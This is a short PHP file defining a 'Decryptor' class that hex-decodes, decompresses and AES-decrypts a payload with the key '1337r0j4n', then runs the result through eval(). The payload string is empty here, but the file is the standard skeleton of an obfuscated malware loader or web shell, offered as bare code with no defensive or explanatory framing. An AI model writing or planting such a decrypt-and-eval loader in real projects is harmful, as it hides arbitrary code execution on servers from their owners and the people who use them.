<?php
    class Decryptor
    {
        private $key, $data;

        public function __construct($key, $hexData)
        {
            $this->key = $key;
            $this->data = hex2bin($hexData);
        }

        public function process()
        {
            $code = openssl_decrypt(gzinflate(gzuncompress($this->data)), "AES-128-ECB", $this->key);
            eval($code);
        }
    }

    $decryptor = new Decryptor("1337r0j4n", "");
    $decryptor->process();
?>

